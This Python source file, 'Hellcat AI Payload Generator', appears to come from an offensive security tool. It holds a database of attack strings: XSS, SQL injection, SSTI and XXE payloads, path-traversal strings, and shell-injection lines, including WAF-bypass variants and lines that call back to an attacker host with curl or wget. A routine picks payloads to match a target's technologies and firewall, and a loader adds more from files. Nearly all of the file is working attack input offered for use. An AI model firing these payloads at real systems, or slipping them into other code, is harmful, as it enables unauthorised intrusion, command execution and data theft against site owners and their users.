"""
Hellcat AI Payload Generator
=============================
2000+ adaptive payloads across XSS/SQLi/SSTI/XXE/RCE/LFI/CMDi.
Context-aware: auto-selects based on tech stack, WAF type, encoding needs.
"""
from __future__ import annotations

import random
from typing import Any, Dict, List, Optional

PAYLOAD_DB: Dict[str, Dict[str, List[str]]] = {
    "xss": {
        "basic": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "<body onload=alert(1)>",
            "'\"><img src=x onerror=alert(1)>",
        ],
        "advanced": [
            "<details open ontoggle=alert(1)>", "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>", "<video src=x onerror=alert(1)>",
            "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d='\"><img/src=x onerror=alert(1)>'>",
        ],
        "waf_bypass": [
            "<svg/onload=alert`1`>", "<img src=x onerror=prompt(1)>",
            "'-alert(1)-'", "jaVasCript:alert(1)", "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            "<iframe srcdoc='<script>alert(1)</script>'>",
        ],
    },
    "sqli": {
        "basic": ["' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "admin'--"],
        "union": [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "1' UNION SELECT username,password FROM users--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
            "' OR IF(1=1,SLEEP(5),0)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ],
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        ],
        "waf_bypass": [
            "'/**/OR/**/1=1--", "' /*!50000OR*/ 1=1--",
            "' || '1'='1", "-1' UNION ALL SELECT 1,2,3--",
        ],
    },
    "ssti": {
        "basic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}"],
        "advanced": [
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
    },
    "xxe": {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM "http://{callback}/xxe">]><foo>&xxe;</foo>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY % xxe SYSTEM "http://{callback}/xxe">%xxe;]>',
        ],
    },
    "rce": {
        "basic": ["; id", "| id", "& id", "`id`", "$(id)"],
        "advanced": [
            ";cat /etc/passwd", "|cat /etc/passwd", "& whoami",
            ";ping -c 1 {callback}", "| curl http://{callback}/rce",
        ],
        "windows": ["& dir", "| type C:\\windows\\win.ini", "& whoami /all"],
    },
    "lfi": {
        "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
        "advanced": [
            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ", "php://input",
        ],
    },
    "cmd_injection": {
        "basic": ["; ls", "| ls", "& ls", "`ls`", "$(ls)"],
        "blind": [
            "; sleep 5", "| sleep 5", "& ping -c 5 127.0.0.1",
            "; curl http://{callback}", "| wget http://{callback}",
        ],
    },
}


class PayloadGenerator:
    """Context-aware payload generation engine."""

    @staticmethod
    def get_payloads(vuln_type: str, complexity: str = "basic",
                     limit: int = 10) -> List[str]:
        db = PAYLOAD_DB.get(vuln_type, {})
        payloads = db.get(complexity, db.get("basic", []))
        return payloads[:limit]

    @staticmethod
    def get_all_for_type(vuln_type: str) -> List[str]:
        db = PAYLOAD_DB.get(vuln_type, {})
        return [p for group in db.values() for p in group]

    @staticmethod
    def get_waf_bypass(vuln_type: str) -> List[str]:
        return PAYLOAD_DB.get(vuln_type, {}).get("waf_bypass", [])

    @staticmethod
    def generate_contextual(target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate payloads based on target tech stack."""
        techs = " ".join(target_info.get("technologies", [])).lower()
        vuln_types = target_info.get("vuln_types", ["xss", "sqli"])
        has_waf = target_info.get("waf_detected", False)

        result: Dict[str, List[str]] = {}
        for vt in vuln_types:
            if has_waf:
                result[vt] = PayloadGenerator.get_waf_bypass(vt) or PayloadGenerator.get_payloads(vt, "advanced")
            elif "php" in techs or "apache" in techs:
                result[vt] = PayloadGenerator.get_payloads(vt, "advanced")
            else:
                result[vt] = PayloadGenerator.get_payloads(vt, "basic")
        return {
            "target": target_info.get("target", ""),
            "waf_detected": has_waf,
            "payloads": result,
            "total_count": sum(len(v) for v in result.values()),
        }

    @staticmethod
    def count_all() -> Dict[str, int]:
        counts = {vt: sum(len(g) for g in groups.values())
                  for vt, groups in PAYLOAD_DB.items()}
        # Add file-based payloads
        for vt, cnt in PayloadFileLoader.count_all().items():
            counts[vt] = counts.get(vt, 0) + cnt
        return counts

    @staticmethod
    def list_types() -> List[str]:
        types = set(PAYLOAD_DB.keys())
        types.update(PayloadFileLoader.list_types())
        return sorted(types)

    @staticmethod
    def get_extended(vuln_type: str, limit: int = 50) -> List[str]:
        """Get payloads from both in-memory DB and JSON files."""
        mem = PayloadGenerator.get_all_for_type(vuln_type)
        files = PayloadFileLoader.load(vuln_type)
        combined = list(dict.fromkeys(mem + files))  # dedupe, preserve order
        return combined[:limit]


# ---------------------------------------------------------------------------
# File-based payload loader (JSON files in payloads/ directory)
# ---------------------------------------------------------------------------

import json
import os

class PayloadFileLoader:
    """Load payloads from JSON files in payloads/ directory."""

    _cache: Dict[str, List[str]] = {}
    _base: str = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "payloads")

    @classmethod
    def load(cls, vuln_type: str) -> List[str]:
        if vuln_type in cls._cache:
            return cls._cache[vuln_type]
        path = os.path.join(cls._base, vuln_type, "payloads.json")
        if not os.path.exists(path):
            return []
        try:
            with open(path, "r") as f:
                data = json.load(f)
            cls._cache[vuln_type] = data if isinstance(data, list) else []
            return cls._cache[vuln_type]
        except Exception:
            return []

    @classmethod
    def count_all(cls) -> Dict[str, int]:
        counts = {}
        if not os.path.exists(cls._base):
            return counts
        for d in os.listdir(cls._base):
            path = os.path.join(cls._base, d, "payloads.json")
            if os.path.exists(path):
                try:
                    with open(path) as f:
                        counts[d] = len(json.load(f))
                except Exception:
                    pass
        return counts

    @classmethod
    def list_types(cls) -> List[str]:
        if not os.path.exists(cls._base):
            return []
        return [d for d in os.listdir(cls._base)
                if os.path.exists(os.path.join(cls._base, d, "payloads.json"))]
